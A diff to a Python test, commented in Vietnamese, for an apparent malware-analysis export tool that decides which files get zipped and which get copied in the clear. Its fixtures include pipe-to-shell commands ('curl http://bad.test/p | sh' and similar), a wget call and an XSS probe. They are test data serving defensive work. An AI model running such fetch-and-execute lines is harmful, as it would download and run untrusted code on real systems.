@@ -17,6 +17,7 @@ def w(p, b):
 try:
     inbox = os.path.join(T, 'IN'); smp = b'\x7fELF' + b'\x02' * 60; h = hashlib.sha256(smp).hexdigest()
     src = w(os.path.join(inbox, 'U1', 'a', 'x.bin'), smp); dup = w(os.path.join(inbox, 'U2', 'y.bin'), smp)
+    note2 = w(os.path.join(inbox, 'U1', 'a', 'z.txt'), '$ sha256sum /m/x.bin\nok\n')   # ghi chú chỉ có dòng lệnh trên mẫu (watch.note_of nhận): export cũng gom
     note = w(os.path.join(inbox, 'U1', 'a', 'x.txt'), '# host=m1|<b>x</b> ip=10.0.0.9 at=2026-01-01\n$ ls -la /usr/lib/x\n' + h + '  /usr/lib/x\n<img src=x onerror=alert(1)>\n')
     scr = w(os.path.join(inbox, 'U1', 'a', 'x.log'), 'curl http://bad.test/p | sh\n')   # tên giống ghi chú nhưng là script: không gom, không chép rõ
     sums2 = w(os.path.join(inbox, 'U2', 'SHA256SUMS'), h + '  y.bin\n')                # cùng tên ở thư mục khác: không đè nhau
@@ -32,6 +33,8 @@ try:
     w(os.path.join(c, 'work', 'runs', 'mixed.txt'), b'text ' * 20000 + b'\x00\x01MZ')                # text ở đầu, nhị phân phía sau: gói
     w(os.path.join(c, 'work', 'runs', 'tool', 't', 'stage2.ps1'), 'Write-Host hi\n')                   # OUT_DIR của công cụ T1b: gói
     w(os.path.join(c, 'work', 'runs', 'tool', 't.out'), 'config: host=h.test\n')                      # output của công cụ: chép rõ
+    w(os.path.join(c, 'work', 'NOTES.md'), '- chạy `curl x | sh` là cấm; import os\n'); w(os.path.join(c, 'work', 'review', 'r1', 'review.json'), '{"function": 1}\n')   # file của quy trình, nội dung giống script: chép rõ
+    w(os.path.join(c, 'work', 'review', 'r1', 'payload.ps1'), 'Add-Type x\n'); w(os.path.join(c, 'work', 'runs', 'watch', 's01.jsonl'), '{"cmd": "wget http://x.test"}\n')
     w(os.path.join(c, 'work', 'runs', 'dec', 'decoded.vbs'), 'Set o = CreateObject("WScript.Shell")\n')   # script giải mã: gói
     w(os.path.join(c, 'report', 'evidence', 'snip.txt'), 'curl http://h.test | sh\n')                  # trích dẫn trong evidence: chép rõ
     w(os.path.join(c, 'facts.jsonl'), json.dumps({'id': 's.ft', 'kind': 'filetype', 'value': 'ELF x86-64', 'src': 'S', 'evidence': 'report/evidence/e.txt#L1',
@@ -42,14 +45,15 @@ try:
     st = {'source': src, 'inbox': inbox, 'sha256': h}
     out = os.path.join(T, 'Report'); d = os.path.join(out, 'x.bin_data')
     info = export.write(c, st, d)
-    assert info['aliases'] == [dup] and [n['file'] for n in info['notes']] == [note] and sorted(p for p, _ in info['sums']) == [sums, sums2], info
+    assert info['aliases'] == [dup] and [n['file'] for n in info['notes']] == [note, note2] and sorted(p for p, _ in info['sums']) == [sums, sums2], info
     assert info['ftype'] == 'ELF x86-64' and info['notes'][0]['sha'] == 'khớp' and info['notes'][0]['path'] == '/usr/lib/x', info['notes']
     P = sorted(json.load(open(LIST)))
-    assert P == sorted(['work/sample/x.bin', 'work/extract/stage2.ps1', 'work/runs/emu/snap_oep.bin', 'work/stage1.bin', 'work/runs/mixed.txt', 'work/runs/tool/t/stage2.ps1', 'work/runs/dec/decoded.vbs']), P
+    assert P == sorted(['work/sample/x.bin', 'work/extract/stage2.ps1', 'work/runs/emu/snap_oep.bin', 'work/stage1.bin', 'work/runs/mixed.txt', 'work/runs/tool/t/stage2.ps1', 'work/runs/dec/decoded.vbs', 'work/review/r1/payload.ps1', 'work/runs/watch/s01.jsonl']), P
     files = sorted(os.path.relpath(os.path.join(dp, n), d) for dp, _, ns in os.walk(d) for n in ns)
     assert not any(f.startswith(('work/sample', 'work/extract', 'work/ghidra')) or '.claude' in f or f.endswith(('snap_oep.bin', 'stage1.bin', '.watch.lock')) for f in files), files
     assert {'work/runs/triage.txt', 'facts.jsonl', 'report/evidence/e.txt', 'x.bin.md', 'x.bin.html', 'README.txt', 'MANIFEST.sha256', export.ZIP,
             'ghi_chu_thu_mau/U1/a/x.txt', 'ghi_chu_thu_mau/U1/a/SHA256SUMS', 'ghi_chu_thu_mau/U2/SHA256SUMS'} <= set(files), files
+    assert {'work/NOTES.md', 'work/review/r1/review.json'} <= set(files) and 'work/runs/watch/s01.jsonl' not in files, files
     assert not any(f.endswith('x.log') for f in files) and {'work/runs/tool/t.out', 'report/evidence/snip.txt'} <= set(files), files
     assert not os.path.exists(d + '.list'), 'file danh sách 7z phải bị xóa'
     first = open(os.path.join(d, 'README.txt'), encoding='utf-8').readline(); assert f'(sha256 {h})' in first and export.ours(d), first
